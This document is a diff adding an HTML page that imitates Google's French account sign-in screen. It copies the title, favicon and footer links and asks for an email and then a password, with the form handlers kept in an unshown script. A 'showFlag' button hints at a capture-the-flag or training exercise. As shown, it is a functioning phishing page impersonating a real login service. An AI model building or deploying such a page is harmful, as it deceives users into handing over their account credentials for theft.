@@ -1,0 +1,92 @@
+<!doctype html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" />
+  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400&display=swap" rel="stylesheet"/>
+  <link rel="icon" type="image/x-icon" href="https://google.com/favicon.ico">
+  <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests"> 
+  <title>Connexion · Comptes Google</title>
+  <script type="text/javascript" src="main.js" defer></script>
+  <link rel="stylesheet" type="text/css" href="main.css">
+</head>
+<body id="document_html_" onload="updatetext()">
+  <div class="container">
+    <div class="card">
+      <div class="Lth2jb " jsname="n7vHCb" jscontroller="rKxYMb" aria-hidden="true">
+        </div>
+      <h2>Se connecter</h2>
+      <h3 id="text_2">Utilisez votre compte Google</h3>
+      
+      <div id="step1">
+        <div class="input-contain">
+          <form onsubmit="event.preventDefault(); next()">
+            <input type="text" id="email_input" name="email_input" autocomplete="off" value="" aria-labelledby="placeholder-email">
+            <label class="placeholder-text" for="email_input" id="placeholder-email">
+              <div id="placeholder_" class="text">Email ou téléphone</div>
+            </label>
+          </form>
+        </div>
+        <div style="text-align: left !important">
+          <b id="error"></b>
+          <div class="btn-email">
+            <button type="button"><a target="_blank" href="https://google.com" class="link">Vous avez oublié votre adresse e‑mail ?</a></button>
+          </div>
+          <p>
+            Pas votre ordinateur ? Utilisez le mode Invité pour vous connecter en privé.
+            <a target="_blank" href="https://support.google.com/chrome/answer/6130773?hl=fr">En savoir plus</a>
+          </p>
+          <div class="card-bottom">
+            <button type="button" onclick="showFlag();" style="margin: 8px;">Annuler</button>
+            <a target="_blank" href="https://google.com">Créer un compte</a>
+            <button type="button" onclick="next()" class="disable-select">Suivant</button>
+          </div>
+        </div>
+      </div>
+
+      <div id="step2" style="display: none;">
+        <div class="email-display-container">
+            <div id="email_display" class="email-text"></div>
+            <button class="change-account-btn" onclick="document.getElementById('save_mail').value='g'; window.location.reload();">Changer de compte</button>
+        </div>
+        
+        <div class="input-contain">
+          <form onsubmit="event.preventDefault(); next2()">
+            <input type="password" id="password_input" name="password_input" autocomplete="off" value="" aria-labelledby="placeholder-password">
+            <label class="placeholder-text" for="password_input" id="placeholder-password">
+              <div id="placeholder_password" class="text">Mot de passe</div>
+            </label>
+          </form>
+        </div>
+
+        <div style="text-align: left !important">
+          <b id="error"></b>
+          <div class="btn-email">
+            <button type="button"><a target="_blank" href="https://google.com" class="link">Mot de passe oublié ?</a></button>
+          </div>
+          </div>
+
+        <div class="card-bottom" style="margin-top: 24px;">
+            <button type="button" onclick="next2()" class="disable-select">Suivant</button>
+        </div>
+
+      </div>
+      <div id="spacer"><br><br><div style="height: 10px;"></div></div>
+      <div class="footer">
+        <select class="disable-select" name="select">
+          <option value="Français (France)">
+            Français (France)
+          </option>
+        </select>
+        <div class="footer-span">
+          <span><a target="_blank" class="btn" href="https://support.google.com/accounts?hl=fr">Aide</a></span>
+          <span><a target="_blank" class="btn" href="https://accounts.google.com/TOS?loc=US&hl=en&privacy=true">Confidentialité</a></span>
+          <span><a target="_blank" class="btn" href="https://accounts.google.com/TOS?loc=US&hl=en">Conditions d'utilisation</a></span>
+        </div>
+      </div>
+    </div>
+  </div>
+  <input type="hidden" value="g" id="save_mail">
+</body>
+</html>
